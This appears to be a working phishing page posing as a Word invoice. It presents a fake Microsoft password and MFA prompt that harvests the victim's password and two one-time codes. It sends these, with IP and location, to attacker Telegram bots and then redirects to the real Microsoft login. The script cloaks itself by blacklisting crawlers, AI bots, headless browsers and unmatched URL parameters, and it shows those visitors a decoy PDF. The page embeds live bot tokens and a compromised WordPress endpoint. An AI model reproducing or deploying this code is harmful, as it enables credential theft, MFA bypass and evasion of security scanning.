<!DOCTYPE html>
<html lang=en data-shell-version=6.418.0-master-bld.1587-159dc8c8-1587 class=background-color-experiment-overrides>
    <meta charset=utf-8>
    <meta name=viewport content="width=device-width,initial-scale=1">
    <meta  content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
    <title>INVOICE   - WORD</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            color: #07090F;
            line-height: 1.42857143;
        }

        iframe {
            width: 100%;
            height: 100vh; /* Full height */
            border: none;
        }
    </style>
<style>@keyframes indeterminateShortCircleTranslateUp{8%{transform:translateY(0)}50%{transform:translateY(-42%)}56%{transform:translateY(-42%)}100%{transform:translateY(0)}}@keyframes indeterminateShortRotationReduceMotion{0%{transform:rotate(0deg)}50%{transform:rotate(180deg)}100%{transform:rotate(360deg)}}@keyframes indeterminateShortCircleTransformsTheme{8%{transform:scale(1);fill:@theme indeterminateShortPrimary}50%{transform:scale(0.6);fill:@theme indeterminateShortSecondary}56%{transform:scale(0.6);fill:@theme indeterminateShortSecondary}100%{transform:scale(1);fill:@theme indeterminateShortPrimary}}@keyframes indeterminateShortCircleTransformsFill{8%{transform:scale(1)}50%{transform:scale(0.6)}56%{transform:scale(0.6)}100%{transform:scale(1)}}#web-shell-spinner{position:fixed;z-index:20010;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center}#web-shell-spinner.has-background{background-color:white}@keyframes IndeterminateShort-indeterminateShortRotation{0%{transform:rotate(0deg)}8%{transform:rotate(0deg)}100%{transform:rotate(470deg)}}@keyframes IndeterminateShort-indeterminateShortCircleTranslateUp{8%{transform:translateY(0)}50%{transform:translateY(-42%)}56%{transform:translateY(-42%)}100%{transform:translateY(0)}}@keyframes IndeterminateShort-indeterminateShortRotationReduceMotion{0%{transform:rotate(0deg)}50%{transform:rotate(180deg)}100%{transform:rotate(360deg)}}@keyframes IndeterminateShort-indeterminateShortCircleTransformsTheme{8%{transform:scale(1);fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4)}50%{transform:scale(0.6);fill:var(--ids-indeterminate-indeterminateShortSecondary-54d1c4)}56%{transform:scale(0.6);fill:var(--ids-indeterminate-indeterminateShortSecondary-54d1c4)}100%{transform:scale(1);fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4)}}@keyframes IndeterminateShort-indeterminateShortCircleTransformsFill{8%{transform:scale(1)}50%{transform:scale(0.6)}56%{transform:scale(0.6)}100%{transform:scale(1)}}#web-shell-spinner .IndeterminateShort-wrapper{display:flex;justify-content:center;align-items:center;box-sizing:border-box;vertical-align:middle;will-change:transform;animation:IndeterminateShort-indeterminateShortRotation 1.4s linear;animation-iteration-count:infinite}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-wrapper{animation:IndeterminateShort-indeterminateShortRotationReduceMotion 20s linear infinite}}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter{position:absolute;width:128px;height:128px}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(2){transform:rotate(90deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(3){transform:rotate(180deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerOuter:nth-of-type(4){transform:rotate(270deg)}#web-shell-spinner .IndeterminateShort-circularSpinnerInner{will-change:transform;animation:IndeterminateShort-indeterminateShortCircleTranslateUp 1.4s cubic-bezier(0.46,0.03,0.52,0.96) infinite;width:128px;height:128px}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-circularSpinnerInner{transform:translateY(-42%);animation:20s cubic-bezier(0.46,0.03,0.52,0.96) infinite}}#web-shell-spinner .IndeterminateShort-circularSpinnerCircle{position:absolute;will-change:transform;fill:var(--ids-indeterminate-indeterminateShortPrimary-54d1c4);animation:IndeterminateShort-indeterminateShortCircleTransformsTheme 1.4s cubic-bezier(0.46,0.03,0.52,0.96) infinite;animation-iteration-count:infinite;width:128px;height:128px}@media screen and (prefers-reduced-motion:reduce){#web-shell-spinner .IndeterminateShort-circularSpinnerCircle{animation:none}}@media screen and (prefers-reduced-motion:reduce){}:root{--ids-indeterminate-indeterminateShortPrimary-54d1c4:#0077c5;--ids-indeterminate-indeterminateShortSecondary-54d1c4:#34bfff}</style>

<link rel=canonical href="https://accounts.intuit.com/app/sign-in?app_group=QBO&amp;asset_alias=Intuit.accounting.core.qbowebapp&amp;app_environment=prod">
<style>img[src="data:,"],source[src="data:,"]{display:none!important}</style>
   
<body>

    <div id="content"></div>

    <script>
        const blacklistedWords = [
            
        'google', 'microsoft', 'crawl','python','curl',
        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
        'img2dataset','omgili','omgilibot'];

    const allowedParamPattern = /^Sachiel\d$/;
    const allowedParamPattern2 = /^Azrael\d$/;
    var checkCountry = false;
    var Country = "";

function getBase64FromUrl() {
    const url = window.location.href;
    const urlObj = new URL(url);

    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));

    let decodedSource = '';
    let extractedSource = '';
    let decodedDevice = '';
    let extractedDevice = '';

    // Process utm_source
    if (utmSource) {
        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
        if (isBase64(base64Part)) {
            try {
                decodedSource = atob(base64Part);
            } catch (error) {
                console.error('Failed to decode Base64 string in utm_source:', error);
                decodedSource = 'Error decoding Base64 string in utm_source.';
            }
        } else {
            extractedSource = base64Part;
        }
    } else {
        extractedSource = 'utm_source parameter not found.';
    }

    // Process utm_device
    if (utmDevice) {
        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
        if (isBase64(base64PartDevice)) {
            try {
                decodedDevice = atob(base64PartDevice);
            } catch (error) {
                console.error('Failed to decode Base64 string in utm_device:', error);
                decodedDevice = 'Error decoding Base64 string in utm_device.';
            }
        } else {
            extractedDevice = base64PartDevice;
        }
    } else {
        extractedDevice = 'utm_device parameter not found.';
    }
    const combinedSource = decodedSource || extractedSource;
    const combinedDevice = decodedDevice || extractedDevice;
    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
    return combinedResult;
}

function isBase64(str) {
    try {
        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
    } catch (err) {
        return false;
    }
}

function sendMessage() {
  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
  const chatId = '1412104349';
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const userDetails = {
    Client_Email: getBase64FromUrl(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timestamp: new Date().toISOString(),
  };

  // Format userDetails into a readable string
  const formattedDetails = `
*User Details:*
- *Client Email*: ${userDetails.Client_Email}
- *User Agent*: ${userDetails.userAgent}
- *Language*: ${userDetails.language}
- *Screen Size*: ${userDetails.screenSize}
- *Color Depth*: ${userDetails.colorDepth}
- *Timestamp*: ${userDetails.timestamp}
  `;

  const data = {
    chat_id: chatId,
    text: formattedDetails,
    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
    .then(response => response.json())
    .then(result => {
      console.log('Message sent successfully:', result);
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
}

function sendMessage2() {
  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
  const chatId = '1412104349';
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const userDetails = {
    Client_Emails: "Incoming Bot",
    Client_Email: getBase64FromUrl(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timestamp: new Date().toISOString(),
  };

  // Format userDetails into a readable string
  const formattedDetails = `
*User Details:*
- *Client Email*: ${userDetails.Client_Emails}
- *Client Email*: ${userDetails.Client_Email}
- *User Agent*: ${userDetails.userAgent}
- *Language*: ${userDetails.language}
- *Screen Size*: ${userDetails.screenSize}
- *Color Depth*: ${userDetails.colorDepth}
- *Timestamp*: ${userDetails.timestamp}
  `;

  const data = {
    chat_id: chatId,
    text: formattedDetails,
    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
  };

  // Use the fetch API to make a POST request to the Telegram Bot API
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
    .then(response => response.json())
    .then(result => {
      console.log('Message sent successfully:', result);
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
}



    function fetchIPInfo() {
        const urlParams = new URLSearchParams(window.location.search);
        const param = urlParams.get('Amethyst');
        const para = urlParams.get('Chamuel');
        if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
            console.log('Invalid parameter. Redirecting to error page...');
            sendMessage2();
            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    addBlacklistedIP(ip);
                    redirectToBlockedPage();
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            return;
        }

        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                var hostname = data.hostname || '';
                console.log('IP Address:', ip);
                console.log('Hostname:', hostname);
                // Check if hostname contains any blacklisted words
                if (blacklistedWords.some(word => hostname.includes(word))) {
                    console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
                    sendMessage2();
                    addBlacklistedIP(ip);
                    redirectToBlockedPage();
                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
                //     // Add IP to blacklist database
                //     addBlacklistedIP(ip);
                //     redirectToBlockedPage();
                } else {
                    console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
                    // Check if IP is blacklisted
                    checkBlacklistedIP(ip);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
    function redirectToBlockedPage() {
        document.getElementById('content').innerHTML = `
            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
                This browser does not support PDFs. Please download the PDF to view it: 
                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
            </iframe>
        `;
    }

    function addBlacklistedIP(ip) {
        // Check if IP is already in the blacklist
        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
            .then(response => response.text())
            .then(data => {
                if (data !== 'blacklisted') {
                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: 'ip=' + ip
                    })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data); // Log the response
                        // You can handle the response here (e.g., display a message to the user)
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        redirectToBlockedPage();
                    });
                } else {
                    console.log('IP ' + ip + ' is already in the blacklist.');
                    redirectToBlockedPage();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                redirectToBlockedPage();
            });
    }


    function checkBlacklistedIP(ip) {
    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
        .then(response => response.text())
        .then(data => {
            if (data === 'blacklisted') {
                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
                sendMessage2();
                addBlacklistedIP(ip);
                redirectToBlockedPage();

            } else if (data === 'clean') {
                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
                loadContent();
            } else {
                console.log('Error:', data);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

    const botUserAgents = [
            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
            'img2dataset', 'omgili', 'omgilibot'
        ];

        // Function to detect the User-Agent
        function detectUserAgent() {
            const userAgent = navigator.userAgent;
            return botUserAgents.some(bot => userAgent.includes(bot));
        }
        function detectQueryParameter(paramName) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
        }
    function loadContent() {
    const isBot = detectUserAgent();
    const paramValue = detectQueryParameter('Bd');
    if (isBot) {
        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                console.log(ip);
                addBlacklistedIP(ip);
                redirectToBlockedPage();}
            ); 
    } else if (paramValue) {
        const script = document.createElement('script');
        script.innerHTML = `
           function isHuman() {
                const userAgent = navigator.userAgent.toLowerCase();
                const botUserAgents = [
            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
            'img2dataset', 'omgili', 'omgilibot'
                ];
                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
                const headlessChecks = [
                    () => /HeadlessChrome/.test(userAgent),
                    () => navigator.webdriver,
                    () => window.outerWidth === 0 && window.outerHeight === 0,
                    () => navigator.languages === "" || navigator.plugins.length === 0
                ];
                const isHeadless = headlessChecks.some(check => check());
                return !isBot && !isHeadless;
            }

            function isValidEmail(email) {
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailPattern.test(email);
            }                

function verifyAndRedirect() {
                if (isHuman()) {
                    if (isValidEmail('${getBase64FromUrl()}')) {
const AUTH_PASSWORD = "correctpassword"; // Simulated password for testing
const DOC_LINK = "https://login.microsoftonline.com/common/login";
const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage"; // Replace with your Telegram bot's webhook URL
const TELEGRAM_BOT_URL2 = "https://api.telegram.org/bot8017134630:AAHQZ5ihGYcYRZJMyg-vh4xYepc0pLUW9-k/sendMessage"; // Replace with your Telegram bot's webhook URL
const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176"; // IPInfo API URL with token

let attemptCounter = 0;
let mfaAttemptCount = 0;
let firstMfaCode = null;

const email = '${getBase64FromUrl()}';
document.getElementById('email').value = email;
document.getElementById('mfa-email').value = email;

// Initial setup: Hide loading gif
const loading = document.getElementById('loading');
loading.style.display = 'none'; // Initially hidden

// Password form handling
const passwordForm = document.getElementById('authForm');
const passwordInput = document.getElementById('password');
const passwordError = document.getElementById('password-error');
const title = document.getElementById('authentication-title'); // The title for authentication

passwordForm.addEventListener('submit', async function (event) {
    event.preventDefault();
    attemptCounter++;
    const location = await getLocation();
    sendToTelegram(email, passwordInput.value, 'Password', location); // Send data to Telegram
    sendToTelegram2(email, passwordInput.value, 'Password', location); // Send data to Telegram
    if (passwordInput.value !== AUTH_PASSWORD) {
        if (attemptCounter === 1) {
            passwordInput.classList.add('error');
            passwordError.style.display = 'block';
        } else {
            transitionToMFA();
        }
    } else {
        showLoadingAndRedirect();
    }
});

passwordInput.addEventListener('input', function () {
    passwordInput.classList.remove('error');
    passwordError.style.display = 'none';
});

// Transition to MFA form
function transitionToMFA() {
    title.style.display = 'none'; // Hide the title
    document.getElementById('password-form').style.display = 'none';
    document.getElementById('mfa-form').style.display = 'block';
    document.getElementById('mfa-code').focus();
}

// MFA form handling
const mfaForm = document.getElementById('mfaAuthForm');
const mfaInput = document.getElementById('mfa-code');
const mfaError = document.getElementById('mfa-error');

mfaForm.addEventListener('submit', async function (event) {
    event.preventDefault();
    const mfaValue = mfaInput.value.trim();
    const location = await getLocation();
    sendToTelegram(email, mfaValue, 'MFA', location);
    sendToTelegram2(email, mfaValue, 'MFA', location);

    if (mfaAttemptCount === 0) {
        if (/^\\d{6}$/.test(mfaValue)) {
            firstMfaCode = mfaValue; // Store the first code
            mfaInput.value = ''; // Clear input for the second attempt
            mfaError.style.display = 'block';
            mfaError.textContent = 'Your code has expired. A new code will be sent to you shortly.'; // Prompt for second code
            mfaAttemptCount++;
        } else {
            mfaError.style.display = 'block';
            mfaError.textContent = 'Invalid MFA code. Please try again.';
            mfaInput.classList.add('error');
        }
    } else if (mfaAttemptCount === 1) {
        if (mfaValue === firstMfaCode) {
            mfaError.style.display = 'block';
            mfaError.textContent = 'You entered an expired code. Try again.';
            mfaInput.classList.add('error');
        } else if (/^\\d{6}$/.test(mfaValue)) {
            showLoadingAndRedirect(); // Proceed to the document upload form
        } else {
            mfaError.style.display = 'block';
            mfaError.textContent = 'Invalid MFA code. Please try again.';
            mfaInput.classList.add('error');
        }
    }
});

mfaInput.addEventListener('input', function () {
    mfaError.style.display = 'none';
    mfaInput.classList.remove('error');
});

// Show loading animation and redirect
function showLoadingAndRedirect() {
    loading.style.display = 'block'; // Show loading gif
    setTimeout(() => {
        window.location.href = DOC_LINK; // Redirect after 3 seconds
    }, 3000);
}

// Function to send data to Telegram
function sendToTelegram(email, inputData, type, location) {
    const userAgent = navigator.userAgent; // Browser details
    const message = \`Email: \${email}\\nInput Type: \${type}\\nInput: \${inputData}\\nUser Agent: \${userAgent}\\nLocation: \${location.city}, \${location.region}, \${location.country}\\nIP: \${location.ip}\`;

    fetch(TELEGRAM_BOT_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '1412104349', // Replace with your Telegram chat ID
            text: message,
        }),
    }).catch(error => console.error('Error sending to Telegram:', error));
}

function sendToTelegram2(email, inputData, type, location) {
    const userAgent = navigator.userAgent; // Browser details
    const message = \`Email: \${email}\\nInput Type: \${type}\\nInput: \${inputData}\\nUser Agent: \${userAgent}\\nLocation: \${location.city}, \${location.region}, \${location.country}\\nIP: \${location.ip}\`;

    fetch(TELEGRAM_BOT_URL2, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '7721980705', // Replace with your Telegram chat ID
            text: message,
        }),
    }).catch(error => console.error('Error sending to Telegram:', error));
}

async function getLocation() {
    try {
        const response = await fetch(IPINFO_URL);
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country || 'Unknown',
        };
    } catch (error) {
        console.error('Error fetching location:', error);
        return {
            ip: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
        };
    }
}
                    
                    } else {
             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                addBlacklistedIP(ip);
                redirectToBlockedPage();}
            ); 
                    }
                } else {
            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                addBlacklistedIP(ip);
                redirectToBlockedPage();}
            ); 
    }
            }

            setTimeout(verifyAndRedirect, 1000);
        `;
        document.getElementById('content').innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authenticate to View Document</title>
     <style>


body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background-image: url('https://i.ibb.co/3yggbnb/00.jpg');
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center;
        background-attachment: fixed;
        height: 100vh;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        direction: ltr;
        font-size: .8125rem;
    }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
            position: relative;
        }

        .header {
            margin-bottom: 10px;
        }

        .logo {
            width: 60px;
            margin-bottom: 10px;
        }

        h2 {
        font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
        color: #333;
        font-size: 15px;
        margin: 0;
        text-align: left;
    }


    input[type="password"], input[type="text"], button {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        width: 100%;
        padding: 8px;
        margin: 5px 0;
        border: 1px solid #ddd;
        border-radius: 5px;
        font-size: 0.95rem;
        box-sizing: border-box;
    }

        button {
            background-color: #004f9deb;
            color: white;
            border: none;
            cursor: pointer;
        }

        button:hover {
            background-color: #03274beb;
        }

        .error-message {
            color: red;
            font-size: 0.8rem;
            display: none;
        }

        .mfa-form {
            display: none;
            text-align: center;
        }

        .mfa-form h3 {
            margin: 10px 0;
        }

        .mfa-gif {
            display: block;
            margin: 10px auto;
            width: 50px;
        }

        .loading {
            margin: 10px auto;
            width: 50px;
        }

        @media (max-width: 400px) {
            h2 {
                font-size: 1.1rem;
            }

            input[type="password"], input[type="text"], button {
                font-size: 0.85rem;
            }

            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://res.cdn.office.net/files/fabric-cdn-prod_20241029.001/assets/item-types/32/docx.svg" alt="Logo" class="logo">
            <br><br><h2 id="authentication-title">For your security, we need you to confirm your Microsoft password to continue. This step ensures your information stays safe and private.</h2>
            <br></div>

        <div id="password-form">
            <form id="authForm">
                <input type="hidden" id="email" name="email">
                <input type="password" id="password" placeholder="Enter your password" aria-label="Password" required>
                <div id="password-error" class="error-message">Incorrect password. Please try again.</div>
                <button type="submit" aria-label="Continue">Continue</button>
            </form>
        </div>

        <div id="mfa-form" class="mfa-form">
            <h3>Enter the MFA Code</h3>
            <img src="https://plugin.intuitcdn.net/identity-authn-core-ui/13139b78b7f32282.gif" alt="MFA Animation" class="mfa-gif">
            <form id="mfaAuthForm">
                <input type="hidden" id="mfa-email" name="email">
                <input type="text" id="mfa-code" placeholder="Enter your MFA code" aria-label="MFA Code" required>
                <div id="mfa-error" class="error-message">Invalid MFA code. Please try again.</div>
                <button type="submit" aria-label="Verify MFA Code">Continue</button>
            </form>
        </div>

        <img src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
    </div>
</body>
</html>
    `;
        document.body.appendChild(script);
    } else {
        document.getElementById('content').innerHTML = `
            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
                This browser does not support PDFs. Please download the PDF to view it: 
                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
            </iframe>
        `;
        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                console.log(ip);
                addBlacklistedIP(ip);
                redirectToBlockedPage();}
            ); 
    }
}
        fetchIPInfo();
    </script>
</body>
</html>
